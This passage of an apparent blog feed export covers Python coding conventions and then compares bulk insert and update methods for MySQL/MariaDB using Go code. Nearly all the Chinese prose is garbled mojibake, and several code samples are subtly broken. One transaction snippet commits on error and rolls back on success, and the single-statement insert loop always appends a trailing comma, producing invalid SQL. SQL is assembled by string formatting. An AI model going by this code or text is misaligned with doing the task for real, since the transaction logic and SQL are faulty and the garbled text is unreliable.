ç»§æ‰¿object, å› ä¸ºobjectå®ç°äº†ä¸€äº›å†…ç½®æ–¹æ³•,æ–¹ä¾¿å…¼å®¹ã€‚ 123456789101112131415161718class SampleClass(object): """Summary of class here. Longer class information.... Longer class information.... Attributes: likes_spam: A boolean indicating if we like SPAM or not. eggs: An integer count of the eggs we have laid. """ def __init__(self, likes_spam=False): """Inits SampleClass with blah.""" self.likes_spam = likes_spam self.eggs = 0 def public_method(self): """Performs operation blah.""" TODOæ³¨é‡Šå¦‚æœç±»æˆ–è€…æ–¹æ³•ï¼Œå‡½æ•° æ²¡æœ‰å®ç°å®Œæ•´åŠŸèƒ½, è¯·ä½¿ç”¨TODOæ ‡è®°, å¾ˆå¤šIDEéƒ½èƒ½æ‰¾åˆ°è¿™ä¸ªæ ‡è®°, æ–¹ä¾¿ä»¥åæ”¹è¿›, åˆ«ç•™å‘.12# TODO(kl@gmail.com): Use a "*" here for string repetition.# TODO(Zeke) Change this to use relations. è®¿é—®æ§åˆ¶åˆç†çš„è®¿é—®æ§åˆ¶ä¼šä½¿å¾—ä»£ç æ›´åŠ å¥å£® __slots__: æ§åˆ¶å¯¹è±¡å¯ä»¥ç»‘å®šçš„å±æ€§, é¿å…å¯¹è±¡è¢«ä¸´æ—¶æ·»åŠ å±æ€§ï¼Œé€ æˆå¯¹è±¡çš„ä¸å¯é¢„æœŸè¡Œä¸ºã€‚ @property: é€šè¿‡å±æ€§è£…é¥°å™¨æ§åˆ¶å±æ€§çš„è¯»å’Œå†™çš„è¡Œä¸º, é˜²æ­¢ä¸ç¬¦åˆè§„èŒƒæ•°æ®çš„å½•å…¥ã€‚ __æˆ–è€…_: ä½¿ç”¨ä¸‹åˆ’çº¿å¼€å¤´çš„å˜é‡ï¼Œä¸ºç§æœ‰å˜é‡(åªæ˜¯åˆ«åäº†, ä½ çœŸæƒ³è®¿é—®è¿˜æ˜¯æœ‰åŠæ³•çš„, ä½†æ˜¯è¯·ä¸è¦è¿™æ ·åš)ã€‚ __all__: å¯¹äºfrom importæ¥è¯´, å¯¼å‡ºæŒ‡å®šå¯¹è±¡, é˜²æ­¢å¯¼å‡ºå…¨å±€å˜é‡ã€‚ æ³¨æ„: å¯¹æš´éœ²å‡ºå»çš„å…±æœ‰å˜é‡è¯·æ…é‡, å› ä¸ºå¦‚æœä½ æš´éœ²å‡ºå»è¿‡ä¼š, ä¸‹æ¬¡åœ¨è°ƒæ•´å°±éœ€è¦è€ƒè™‘åˆ°å…¼å®¹æ€§äº†, æ‰€ä»¥ä¼˜å…ˆä½¿ç”¨ç§æœ‰å˜é‡(__æˆ–è€…_)ã€‚ 123456789101112131415class Student(object): __slots__ = ['birth', 'age'] @property def birth(self): return self._birth @birth.setter def birth(self, value): self._birth = value @property def age(self): return 2015 - self._birth å‘½åçº¦å®šPythonåº“çš„å‘½åçº¦å®šæœ‰ç‚¹æ··ä¹±ï¼Œä¸å¯èƒ½å®Œå…¨ä¸€è‡´ã€‚ä½†ä¾ç„¶æœ‰äº›æ™®éæ¨èçš„å‘½åè§„èŒƒçš„ã€‚æ–°çš„æ¨¡å—å’ŒåŒ… (åŒ…æ‹¬ç¬¬ä¸‰æ–¹çš„æ¡†æ¶) åº”è¯¥éµå¾ªè¿™äº›æ ‡å‡†ã€‚å¯¹ä¸åŒé£æ ¼çš„å·²æœ‰çš„åº“ï¼Œå»ºè®®ä¿æŒå†…éƒ¨çš„ä¸€è‡´æ€§ã€‚ åŒ…å’Œæ¨¡å—å: æ¨¡å—åè¦ç®€çŸ­ï¼Œå…¨éƒ¨ç”¨å°å†™å­—æ¯ï¼Œå¯ä½¿ç”¨ä¸‹åˆ’çº¿ä»¥æé«˜å¯è¯»æ€§ã€‚åŒ…åå’Œæ¨¡å—åç±»ä¼¼ï¼Œä½†ä¸æ¨èä½¿ç”¨ä¸‹åˆ’çº¿ ç±»å: éµå¾ªCapWordã€‚ å‡½æ•°å’Œæ–¹æ³•çš„å‚æ•°: å®ä¾‹æ–¹æ³•ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ â€˜selfâ€™ã€‚ç±»æ–¹æ³•ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ â€˜clsâ€™ã€‚å¦‚æœå‡½æ•°çš„å‚æ•°åä¸ä¿ç•™å…³é”®å­—å†²çªï¼Œé€šå¸¸åœ¨å‚æ•°åååŠ ä¸€ä¸ªä¸‹åˆ’çº¿ã€‚ æ–¹æ³•åå’Œå®ä¾‹å˜é‡: åŒå‡½æ•°å‘½åè§„åˆ™ã€‚ éå…¬å¼€æ–¹æ³•å’Œå®ä¾‹å˜é‡å¢åŠ ä¸€ä¸ªå‰ç½®ä¸‹åˆ’çº¿ã€‚ ä¸ºé¿å…ä¸å­ç±»å‘½åå†²çªï¼Œé‡‡ç”¨ä¸¤ä¸ªå‰ç½®ä¸‹åˆ’çº¿æ¥è§¦å‘é‡æ•´ã€‚ç±»Fooå±æ€§åä¸º__aï¼Œ ä¸èƒ½ä»¥ Foo.__aè®¿é—®ã€‚(æ‰§è‘—çš„ç”¨æˆ·è¿˜æ˜¯å¯ä»¥é€šè¿‡Foo._Foo__aã€‚) é€šå¸¸åŒå‰ç½®ä¸‹åˆ’çº¿ä»…è¢«ç”¨æ¥é¿å…ä¸åŸºç±»çš„å±æ€§å‘ç”Ÿå‘½åå†²çªã€‚ å‡½æ•°å: å‡½æ•°ååº”è¯¥ä¸ºå°å†™ï¼Œå¿…è¦æ—¶å¯ç”¨ä¸‹åˆ’çº¿åˆ†éš”å•è¯ä»¥å¢åŠ å¯è¯»æ€§ã€‚ mixedCase(æ··åˆå¤§å°å†™)ä»…è¢«å…è®¸ç”¨äºå…¼å®¹æ€§è€ƒè™‘(å¦‚: threading.py)ã€‚ å¼‚å¸¸å: å¦‚æœç¡®å®æ˜¯é”™è¯¯ï¼Œéœ€è¦åœ¨ç±»åæ·»åŠ åç¼€ â€œErrorâ€ã€‚ å…¨å±€å˜é‡å: å˜é‡å°½é‡åªç”¨äºæ¨¡å—å†…éƒ¨ï¼Œçº¦å®šç±»ä¼¼å‡½æ•°ã€‚ å¯¹è®¾è®¡ä¸ºé€šè¿‡ â€œfrom M import â€ æ¥ä½¿ç”¨çš„æ¨¡å—ï¼Œåº”é‡‡ç”¨__all__æœºåˆ¶æ¥é˜²æ­¢å¯¼å…¥å…¨å±€å˜é‡ï¼›æˆ–è€…ä¸ºå…¨å±€å˜é‡åŠ ä¸€ä¸ªå‰ç½®ä¸‹åˆ’çº¿ã€‚ å¸¸é‡: å¸¸é‡é€šå¸¸åœ¨æ¨¡å—çº§å®šä¹‰,ç”±å¤§å†™å­—æ¯ç”¨ä¸‹åˆ’çº¿åˆ†éš”ç»„æˆã€‚æ¯”å¦‚æ‹¬MAX_OVERFLOWå’ŒTOTALã€‚ åˆç†çš„è®¾è®¡æ¥å£è®¾è®¡è€ƒè™‘ç±»çš„æ–¹æ³•å’Œå®ä¾‹å˜é‡(ç»Ÿç§°ä¸ºå±æ€§)æ˜¯å¦å…¬å¼€ã€‚å¦‚æœæœ‰ç–‘é—®ï¼Œé€‰æ‹©ä¸å…¬å¼€ï¼›æŠŠå…¶æ”¹ä¸ºå…¬å¼€æ¯”æŠŠå…¬å¼€å±æ€§æ”¹ä¸ºéå…¬å¼€è¦å®¹æ˜“ã€‚å…¬å¼€å±æ€§å¯ä¾›æ‰€æœ‰äººä½¿ç”¨ï¼Œå¹¶é€šå¸¸å‘åå…¼å®¹ã€‚éå…¬å¼€å±æ€§ä¸ç»™ç¬¬ä¸‰æ–¹ä½¿ç”¨ã€å¯å˜ç”šè‡³è¢«ç§»é™¤ã€‚è¿™é‡Œä¸ä½¿ç”¨æœ¯è¯­â€privateâ€ï¼Œ Pythonä¸­æ²¡æœ‰å±æ€§æ˜¯çœŸæ­£ç§æœ‰çš„ã€‚å¦ä¸€ç±»å±æ€§æ˜¯å­ç±»API(åœ¨å…¶ä»–è¯­è¨€ä¸­é€šå¸¸ç§°ä¸º â€œprotectedâ€)ã€‚ ä¸€äº›ç±»è¢«è®¾è®¡ä¸ºåŸºç±»ï¼Œå¯ä»¥æ‰©å±•å’Œä¿®æ”¹ã€‚ è°¨è®°è¿™äº›PythonæŒ‡å—ï¼š å…¬å¼€å±æ€§åº”è¯¥æ²¡æœ‰å‰å¯¼ä¸‹åˆ’çº¿ å¦‚æœå…¬å¼€å±æ€§åå’Œä¿ç•™å…³é”®å­—å†²çªï¼Œå¯ä»¥æ·»åŠ åç½®ä¸‹åˆ’çº¿ ç®€å•çš„å…¬å¼€æ•°æ®å±æ€§ï¼Œæœ€å¥½åªå…¬å¼€å±æ€§åï¼Œæ²¡æœ‰å¤æ‚çš„è®¿é—®/ä¿®æ”¹æ–¹æ³•ï¼Œpythonçš„Propertyæä¾›äº†å¾ˆå¥½çš„å°è£…æ–¹æ³•ã€‚ å¦‚æœä¸å¸Œæœ›å­ç±»ä½¿ç”¨çš„å±æ€§ï¼Œè€ƒè™‘ç”¨ä¸¤ä¸ªå‰ç½®ä¸‹åˆ’çº¿(æ²¡æœ‰åç½®ä¸‹åˆ’çº¿)å‘½å ä»»ä½•å‘åå…¼å®¹çš„ä¿è¯åªé€‚ç”¨äºå…¬å…±æ¥å£ã€‚ æ–‡æ¡£åŒ–çš„æ¥å£é€šå¸¸æ˜¯å…¬å…±çš„ï¼Œé™¤éæ˜è¯´æ˜æ˜¯ä¸´æ—¶çš„æˆ–ä¸ºå†…éƒ¨æ¥å£ã€å…¶ä»–æ‰€æœ‰æ¥å£é»˜è®¤æ˜¯å†…éƒ¨çš„ã€‚ ä¸ºäº†æ›´å¥½åœ°æ”¯æŒå†…çœï¼Œæ¨¡å—è¦åœ¨__all__å±æ€§åˆ—å‡ºå…¬å…±APIã€‚ å†…éƒ¨æ¥å£è¦æœ‰å‰ç½®ä¸‹åˆ’çº¿ã€‚ å¦‚æœå‘½åç©ºé—´(åŒ…ã€æ¨¡å—æˆ–ç±»)æ˜¯å†…éƒ¨çš„ï¼Œé‡Œé¢çš„æ¥å£ä¹Ÿæ˜¯å†…éƒ¨çš„ã€‚ å¯¼å…¥åç§°åº”è§†ä¸ºå®ç°ç»†èŠ‚ã€‚å…¶ä»–æ¨¡å—ä¸èƒ½é—´æ¥è®¿åå­—ï¼Œé™¤éåœ¨æ¨¡å—çš„APIæ–‡æ¡£ä¸­æ˜ç¡®è®°è½½ï¼Œå¦‚os.pathä¸­æˆ–åŒ…çš„__init__æš´éœ²äº†å­æ¨¡å—ã€‚ å‡½æ•°è®¾è®¡å½“æµç¨‹è¶³å¤Ÿç¹æ‚æ—¶ï¼Œå°±è¦è€ƒè™‘å‡½æ•°ï¼ŒåŠå¦‚ä½•å°†å‡½æ•°ç»„åˆåœ¨ä¸€èµ·ã€‚åœ¨Pythonä¸­åšå‡½æ•°è®¾è®¡ï¼Œä¸»è¦è€ƒè™‘åˆ°å‡½æ•°å¤§å°ã€èšåˆæ€§ã€è€¦åˆæ€§ä¸‰ä¸ªæ–¹é¢ï¼Œè¿™ä¸‰è€…åº”è¯¥å½’ç»“äºè§„åˆ’ä¸è®¾è®¡çš„èŒƒç•´ã€‚é«˜å†…èšã€ä½è€¦åˆåˆ™æ˜¯ä»»ä½•è¯­è¨€å‡½æ•°è®¾è®¡çš„æ€»ä½“åŸåˆ™ã€‚ å¦‚ä½•å°†ä»»åŠ¡åˆ†è§£æˆæ›´æœ‰é’ˆå¯¹æ€§çš„å‡½æ•°ä»è€Œå¯¼è‡´äº†èšåˆæ€§ å¦‚ä½•è®¾è®¡å‡½æ•°é—´çš„é€šä¿¡åˆ™åˆæ¶‰åŠåˆ°è€¦åˆæ€§ å¦‚ä½•è®¾è®¡å‡½æ•°çš„å¤§å°ç”¨ä»¥åŠ å¼ºå…¶èšåˆæ€§åŠé™ä½å…¶è€¦åˆæ€§ èšåˆ å®Œç¾çš„ç¨‹åºè®¾è®¡ï¼Œæ¯ä¸ªå‡½æ•°åº”è¯¥è€Œä¸”åªéœ€åšä¸€ä»¶äº‹ æ¯”å¦‚è¯´:æŠŠå¤§è±¡æ”¾è¿›å†°ç®±åˆ†ä¸‰æ­¥:æŠŠé—¨æ‰“å¼€ã€æŠŠå¤§è±¡æ”¾è¿›å»ã€æŠŠé—¨å…³ä¸Šã€‚ è¿™æ ·å°±åº”è¯¥å†™ä¸‰ä¸ªå‡½æ•°è€Œä¸æ˜¯ä¸€ä¸ªå‡½æ•°æ‹¿æ‰€æœ‰çš„äº‹å…¨åšäº†ã€‚è¿™æ ·ç»“æ„æ¸…æ™°ï¼Œå±‚æ¬¡åˆ†æ˜ï¼Œä¹Ÿå¥½ç†è§£ï¼ å¤§å° Pythonä»£ç ä»¥ç®€å•æ˜äº†è‘—ç§°ï¼Œä¸€ä¸ªè¿‡é•¿æˆ–è€…æœ‰ç€æ·±å±‚åµŒå¥—çš„å‡½æ•°å¾€å¾€æˆä¸ºè®¾è®¡ç¼ºé™·çš„å¾å…†ã€‚ å¦‚æœé¡¹ç›®ä¸­è®¾è®¡çš„ä¸€ä¸ªå‡½æ•°éœ€è¦ç¿»é¡µæ‰èƒ½çœ‹å®Œçš„è¯ï¼Œå°±è¦è€ƒè™‘å°†å‡½æ•°æ‹†åˆ†äº†ã€‚ è€¦åˆ å‚æ•°ä¼ å…¥ï¼Œreturnç»“æœ, è¿™æ ·åšå¯ä»¥è®©å‡½æ•°ç‹¬ç«‹äºå®ƒå¤–éƒ¨çš„ä¸œè¥¿ã€‚å‚æ•°å’Œreturnè¯­å¥å°±æ˜¯éš”ç¦»å¤–éƒ¨ä¾èµ–çš„æœ€å¥½çš„åŠæ³•ã€‚ æ…ç”¨å…¨å±€å˜é‡, å…¨å±€å˜é‡é€šå¸¸æ˜¯ä¸€ç§è¹©è„šçš„å‡½æ•°é—´çš„è¿›è¡Œé€šä¿¡çš„æ–¹å¼ã€‚å®ƒä¼šå¼•å‘ä¾èµ–å…³ç³»å’Œè®¡æ—¶çš„é—®é¢˜ï¼Œä»è€Œä¼šå¯¼è‡´ç¨‹åºè°ƒè¯•å’Œä¿®æ”¹çš„å›°éš¾ã€‚è€Œä¸”ä»ä»£ç åŠæ€§èƒ½ä¼˜åŒ–æ¥è€ƒè™‘ï¼Œæœ¬åœ°å˜é‡è¿œæ¯”å…¨å±€å˜é‡å¿«ã€‚ é¿å…ä¿®æ”¹å¯å˜ç±»å‹çš„å‚æ•°ï¼ˆæˆ–è€…ç›´æ¥é¿å…ä¼ å…¥å¯å˜ç±»å‹çš„å‚æ•°ï¼Œè€Œä½¿ç”¨argsï¼Œ æˆ–è€…*kwargs æ”¶é›†ï¼‰Pythonæ•°æ®ç±»å‹æ¯”å¦‚è¯´åˆ—è¡¨ã€å­—å…¸å±äºå¯å˜å¯¹è±¡ã€‚åœ¨ä½œä¸ºå‚æ•°ä¼ é€’ç»™å‡½æ•°æ—¶ï¼Œæœ‰æ—¶ä¼šåƒå…¨å±€å˜é‡ä¸€æ ·è¢«ä¿®æ”¹ã€‚è¿™æ ·åšçš„åå¤„æ˜¯ï¼šå¢å¼ºäº†å‡½æ•°ä¹‹é—´çš„è€¦åˆæ€§ï¼Œä»è€Œå¯¼è‡´å‡½æ•°è¿‡äºç‰¹æ®Šå’Œä¸å‹å¥½ã€‚ç»´æŠ¤èµ·æ¥ä¹Ÿå›°éš¾ã€‚è¿™ä¸ªæ—¶å€™å°±è¦è€ƒè™‘ä½¿ç”¨åˆ‡ç‰‡S[:]å’Œcopyæ¨¡å—ä¸­çš„copy()å‡½æ•°å’Œdeepcopy()å‡½æ•°æ¥åšä¸ªæ‹·è´ï¼Œé¿å…ä¿®æ”¹å¯å˜å¯¹è±¡ å‚è€ƒæ–‡æ¡£ PEP8å®˜æ–¹æ–‡æ¡£ PEP8ä¸­æ–‡ç¿»è¯‘ Google Pythoné£æ ¼æŒ‡å—]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>pythonic</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQLæ‰¹é‡æ›´æ–°ä¸æ’å…¥]]></title>
    <url>%2F2017%2F06%2F19%2Fmysql-performance-for-bulk-action%2F</url>
    <content type="text"><![CDATA[æœ€è¿‘ä¸€ç›´ä½¿ç”¨gormæ¥æ“ä½œæ•°æ®åº“, ä½†å½“é‡åˆ°ä¸€äº›æ‰¹é‡æ“ä½œæ—¶,æ„Ÿè§‰æ€§èƒ½å¾ˆå·®, åŸå› å¾ˆç®€å•, gormæ˜¯ä¸€æ¡ä¸€æ¡çš„æ‰§è¡Œçš„,æ•ˆç‡å¾ˆä½, æ‰€ä»¥å¯¹äºæ‰¹é‡æ“ä½œ, ç‰¹åˆ«æ˜¯å¯¹äºå¤§é‡recordéœ€è¦åˆ›å»ºæˆ–è€…ä¿®æ”¹æ—¶, ç›´æ¥ä½¿ç”¨SQL, æ‰æ˜¯æ­£ç¡®çš„é€‰æ‹©ã€‚ è°ƒæ•´MySQLé…ç½®(MariaDB10) bulk_insert_buffer_size: è°ƒæ•´æ‰¹é‡æ’å…¥ç¼“å†²ï¼Œ é»˜è®¤æ˜¯16M, ä¸ºäº†èƒ½æ”¯æŒæ›´å¤§æ•°æ®çš„æ‰¹é‡æ’å…¥, æŒ‰éœ€è°ƒæ•´, æˆ‘è¿™é‡Œè°ƒæ•´åˆ°128M net_buffer_length: å®¢æˆ·å‘å‡ºçš„SQLè¯­å¥æœŸæœ›çš„é•¿åº¦, é»˜è®¤æ˜¯16Kã€‚å¦‚æœè¯­å¥è¶…è¿‡è¿™ä¸ªé•¿åº¦ï¼Œç¼“å†²åŒºè‡ªåŠ¨åœ°è¢«æ‰©å¤§ï¼Œç›´åˆ°max_allowed_packetä¸ªå­—èŠ‚, æˆ‘è°ƒæ•´åˆ°128K max_allowed_packet: ä¸€ä¸ªåŒ…çš„æœ€å¤§å°ºå¯¸, é»˜è®¤ä¹Ÿæ˜¯16Mã€‚æ¶ˆæ¯ç¼“å†²åŒºè¢«åˆå§‹åŒ–ä¸ºnet_buffer_lengthå­—èŠ‚ï¼Œä½†æ˜¯å¯åœ¨éœ€è¦æ—¶å¢åŠ åˆ°max_allowed_packetä¸ªå­—èŠ‚, æˆ‘ä¹Ÿè°ƒæ•´åˆ°128M å°†è¿™äº›é…ç½®å†™å…¥MySQLçš„é…ç½®æ–‡ä»¶ä¸­123bulk_insert_buffer_size = 128Mnet_buffer_length = 128Kmax_allowed_packet = 128M ä»å¯MySQLæŸ¥çœ‹è¿™äº›å…¨å±€å˜é‡æ˜¯å¦ç”Ÿæ•ˆ12345678910111213141516171819202122232425262728293031Welcome to the MariaDB monitor. Commands end with ; or \g.Your MariaDB connection id is 142Server version: 10.1.21-MariaDB-1~jessie mariadb.org binary distributionCopyright (c) 2000, 2016, Oracle, MariaDB Corporation Ab and others.Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.MariaDB [(none)]&gt; show variables like "bulk_insert_buffer_size";+-------------------------+----------+| Variable_name | Value |+-------------------------+----------+| bulk_insert_buffer_size | 16777216 |+-------------------------+----------+1 row in set (0.00 sec)MariaDB [(none)]&gt; show variables like "net_buffer_length";+-------------------+-------+| Variable_name | Value |+-------------------+-------+| net_buffer_length | 16384 |+-------------------+-------+1 row in set (0.00 sec)MariaDB [(none)]&gt; show variables like "max_allowed_packet";+--------------------+----------+| Variable_name | Value |+--------------------+----------+| max_allowed_packet | 16777216 |+--------------------+----------+1 row in set (0.00 sec) ä½¿ç”¨äº‹åŠ¡æ‰¹é‡åˆ›å»ºå’Œä¿®æ”¹å¤šæ¡è®°å½•æ—¶, å¦‚æœä½¿ç”¨äº†å¤šæ¡è¯­å¥, è¯·ä¸€å®šä½¿ç”¨äº‹ç‰©, å› ä¸ºè¿™äº›åŠ¨ä½œæ˜¯ä¸€ä¸ªäº‹ç‰©, é¿å…éƒ¨åˆ†æˆåŠŸ,éƒ¨åˆ†å¤±è´¥ é€ æˆæ•°æ®ä¸ä¸€è‡´çš„é—®é¢˜ã€‚12345678tx,_ := db.Begin() stm,_ := Tx.Preapare("insert into test values(?,null)") result,err := stm.Exec('123')if err != nil &#123; tx.Commit()&#125; else &#123; tx.Rollback()&#125; æ‰¹é‡æ’å…¥æ‰¹é‡æ’å…¥çš„æ–¹æ³•ä¸€èˆ¬åŒ…å«: ç›´æ¥å¾ªç¯æä¾›(éå¸¸ä¸æ¨è) åŸºäºäº‹ç‰©çš„å¾ªç¯æäº¤ åˆ©ç”¨INSERT INTOçš„å¤šå€¼æ’å…¥è¯­å¥ è¿™é‡Œä»¥æ’å…¥10000æ¡æ•°æ®ä¸ºä¾‹è¿›è¡Œæµ‹è¯•, å…³äºä¸‹é¢çš„æµ‹è¯•ä»£ç è§: æµ‹è¯•ä»£ç å®Œæ•´ç¤ºä¾‹ ç›´æ¥å¾ªç¯æäº¤123456789101112131415// ä½¿ç”¨Forå¾ªç¯æ‰§è¡Œfunc forInsert() &#123; start := time.Now() stmt, err := db.Prepare(`INSERT user (user_name,user_age,user_sex) values (?,?,?)`) checkErr(err) for i := 0; i &lt; 10000; i++ &#123; name := "tony" + strconv.Itoa(i) _, err := stmt.Exec(name, i, 1) checkErr(err) &#125; delta := time.Now().Sub(start).String() fmt.Println("For Insert Total Time: ", delta)&#125; åŸºäºäº‹ç‰©å¾ªç¯æäº¤12345678910111213141516171819202122232425262728// åœ¨ä¸€ä¸ªäº‹ç‰©å†…å¾ªç¯æ‰§è¡Œfunc withTxInsert() &#123; start := time.Now() tx, err := db.Begin() checkErr(err) stmt, err := tx.Prepare(`INSERT user (user_name,user_age,user_sex) values (?,?,?)`) checkErr(err) for i := 0; i &lt; 10000; i++ &#123; name := "tony" + strconv.Itoa(i) _, err := stmt.Exec(name, i, 1) checkErr(err) &#125; if err != nil &#123; err := tx.Rollback() checkErr(err) return &#125; err = tx.Commit() checkErr(err) delta := time.Now().Sub(start).String() fmt.Println("Bulk With Transaction Insert Total Time: ", delta)&#125; æ„é€ æˆä¸€æ¡è¯­å¥æäº¤SQLæ ·ä¾‹: â€œINSERT INTO table (field1,field2,field3) VALUES (â€˜aâ€™,â€™bâ€™,â€™câ€™), (â€˜aâ€™,â€™bâ€™,â€™câ€™),(â€˜aâ€™,â€™bâ€™,â€™câ€™);â€12345678910111213141516171819202122232425262728// æ„é€ ä¸€æ¡Insertè¯­å¥æ‰¹é‡æäº¤func bulkoneInsert() &#123; start := time.Now() sql := "INSERT INTO `user` (`user_name`,`user_age`,`user_sex`) VALUES " for i := 0; i &lt; 10000; i++ &#123; name := "tony" + strconv.Itoa(i) if i &lt; 10000 &#123; sql += fmt.Sprintf("('%s','%d','%d'),", name, i, 1) &#125; else &#123; sql += fmt.Sprintf("('%s','%d','%d');", name, i, 1) &#125; &#125; // fmt.Println(sql) tx, err := db.Begin() checkErr(err) _, err = tx.Exec(sql) if err == nil &#123; tx.Commit() &#125; else &#123; fmt.Println(err) tx.Rollback() &#125; delta := time.Now().Sub(start).String() fmt.Println("Bulk One Insert Total Time: ", delta)&#125; æ€»ç»“æœ€å¯¹3ç§çŠ¶å†µçš„æ’å…¥æ—¶é—´æ’å: Ranking Function Name Time 1 bulkoneInsert 283.548003ms 2 withTxInsert 4.047390845s 3 forInsert 1m55.580310398s ç»“è®ºå¾ˆæ˜æ˜¾: æ„é€ ä¸€æ¡SQLæ’å…¥æ•ˆç‡é«˜å¾ˆå¤š æ‰¹é‡æ›´æ–°æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¤šä¸ªUPDATEè¯­å¥æ‰¹é‡æäº¤, åŒæ—¶MySQLä¹Ÿæ”¯æŒä¸€ä¸ªSQLè¯­å¥æ‰¹é‡æ›´æ–°å¤šæ¡è®°å½•, æ ‡å‡†çš„SQLæ˜¯ä½¿ç”¨UPDATE WHENæ¥å®ç°, é™¤æ­¤ä¹‹å¤– ä»–çš„SQLæ‰©å±•è¿˜æ”¯æŒINSERT INTO å’ŒREPLACE INTOç”¨äºrecordçš„æ‰¹é‡æ›´æ–°, ä½†æ˜¯æœ€å¥½åˆ«ç”¨REPLACE INTO, å› ä¸ºä»–æ˜¯å…ˆåˆ é™¤å†æ–°å¢, å› æ­¤æœ¬è´¨ä¸Šå®ƒä¸æ˜¯æ›´æ–°æ“ä½œ, å› ä¸ºåˆ é™¤å, æ›´æ–°æ—¶ç¼ºå°‘æŸäº›å­—æ®µçš„è¯, ä¼šå¯¼è‡´æ•°æ®ä¸¢å¤±, è¿™åœ¨ä¸šåŠ¡ä¸Šæ˜¯ç»å¯¹ä¸å…è®¸çš„, è¯·è°¨æ…ä½¿ç”¨ REPLACE INTOã€‚è€ŒINSERT INTOåˆ™ä¸ä¼šè¿™æ ·ã€‚ æœ€åä½¿ç”¨ä¸´æ—¶è¡¨ä¹Ÿèƒ½è¿›è¡Œæ‰¹é‡æ›´æ–°(å…ˆæ›´æ–°ä¸´æ—¶è¡¨ï¼Œç„¶åä»ä¸´æ—¶è¡¨ä¸­update),æ•ˆç‡ä¹Ÿç›¸å½“ä¸é”™,ä½†æ˜¯éœ€è¦ç”¨æˆ·æœ‰temporaryè¡¨çš„createæƒé™, å› æ­¤ä½¿ç”¨ä¹Ÿå—é™ã€‚æˆ‘ä¸€èˆ¬ä¼šä½¿ç”¨INSERT INTOæ¥æ„é€ æ‰¹é‡æ›´æ–°çš„SQL, å› ä¸ºè¯¥è¯­æ³•æ–¹ä¾¿æ„é€ , ä¸‹é¢ä¼šå¯¹å„ç§æ“ä½œåšç®€å•çš„æ€§èƒ½å¯¹æ¯”ã€‚ è¿™é‡Œä»¥æ›´æ–°10000æ¡æ•°æ®ä¸ºä¾‹è¿›è¡Œæµ‹è¯•(åŸºäºä¸Šé¢æ’å…¥çš„æ•°æ®), å…³äºä¸‹é¢çš„æµ‹è¯•ä»£ç è§: æµ‹è¯•ä»£ç å®Œæ•´ç¤ºä¾‹ å¾ªç¯æ›´æ–°1234567891011121314151617181920212223242526272829// å¾ªç¯æ›´æ–°// UPDATE table SET column1=?,column2=? WHERE column=?func withTxUpdate() &#123; start := time.Now() tx, err := db.Begin() checkErr(err) stmt, err := tx.Prepare("UPDATE `user` SET `user_name`=? WHERE `user_id`=?;") checkErr(err) for i := 0; i &lt; 10000; i++ &#123; name := "forupdate" + strconv.Itoa(i) _, err := stmt.Exec(name, i+1) checkErr(err) &#125; if err != nil &#123; err := tx.Rollback() checkErr(err) return &#125; err = tx.Commit() checkErr(err) delta := time.Now().Sub(start).String() fmt.Println("Bulk With Transaction Update Total Time: ", delta)&#125; æ ‡å‡†çš„UPDATEè¯­å¥æ‰¹é‡æ›´æ–°12345678910111213141516171819202122232425262728293031323334353637383940414243// æ ‡å‡†Updateè¯­å¥æ›´æ–°// UPDATE categories// SET dingdan = CASE id// WHEN 1 THEN 3// WHEN 2 THEN 4// WHEN 3 THEN 5// END,// title = CASE id// WHEN 1 THEN 'New Title 1'// WHEN 2 THEN 'New Title 2'// WHEN 3 THEN 'New Title 3'// END// WHERE id IN (1,2,3)func bulkStandardUpdate() &#123; start := time.Now() core := "" where := "" for i := 0; i &lt; 10000; i++ &#123; name := "standardupdate" + strconv.Itoa(i) core += fmt.Sprintf("WHEN '%d' THEN '%s' ", i+1, name) if i == 0 &#123; where += fmt.Sprintf("'%d'", i+1) &#125; else &#123; where += fmt.Sprintf(",'%d'", i+1) &#125; &#125; sql := fmt.Sprintf("UPDATE `user` SET `user_name`= CASE `user_id` %s END WHERE `user_id` IN (%s)", core, where) tx, err := db.Begin() checkErr(err) _, err = tx.Exec(sql) if err == nil &#123; tx.Commit() &#125; else &#123; fmt.Println(err) tx.Rollback() &#125; delta := time.Now().Sub(start).String() fmt.Println("Bulk Standard Update Total Time: ", delta)&#125; SQLæ‰©å±•(INSERT INTO â€¦ ON DUPLICATE KEY UPDATE)123456789101112131415161718192021222324252627282930// insert intoè¯­å¥æ›´æ–°// INSERT INTO test_tbl (id,dr) VALUES (1,'2'),(2,'3'),...(x,'y') ON DUPLICATE KEY UPDATE dr=values(dr);func bulkInsertIntoUpdate() &#123; start := time.Now() core := "" for i := 0; i &lt; 10000; i++ &#123; name := "insertintoupdate" + strconv.Itoa(i) if i == 0 &#123; core += fmt.Sprintf("('%d', '%s')", i+1, name) &#125; else &#123; core += fmt.Sprintf(",('%d', '%s')", i+1, name) &#125; &#125; sql := fmt.Sprintf("INSERT INTO `user` (`user_id`, `user_name`) VALUES %s ON DUPLICATE KEY UPDATE `user_name`=values(`user_name`);", core) tx, err := db.Begin() checkErr(err) _, err = tx.Exec(sql) if err == nil &#123; tx.Commit() &#125; else &#123; fmt.Println(err) tx.Rollback() &#125; delta := time.Now().Sub(start).String() fmt.Println("Bulk Insert Into Update Total Time: ", delta)&#125; SQLæ‰©å±•(REPLACE INTO)123456789101112131415161718192021222324252627282930// replace inotè¯­å¥æ›´æ–°// REPLACE INTO test_tbl (id,dr) VALUES (1,'2'),(2,'3'),...(x,'y');func bulkReplaceIntoUpdate() &#123; start := time.Now() core := "" for i := 0; i &lt; 10000; i++ &#123; name := "replaceintoupdate" + strconv.Itoa(i) if i == 0 &#123; core += fmt.Sprintf("('%d', '%s')", i+1, name) &#125; else &#123; core += fmt.Sprintf(",('%d', '%s')", i+1, name) &#125; &#125; sql := fmt.Sprintf("REPLACE INTO `user` (`user_id`, `user_name`) VALUES %s;", core) tx, err := db.Begin() checkErr(err) _, err = tx.Exec(sql) if err == nil &#123; tx.Commit() &#125; else &#123; fmt.Println(err) tx.Rollback() &#125; delta := time.Now().Sub(start).String() fmt.Println("Bulk Replace Into Update Total Time: ", delta)&#125; 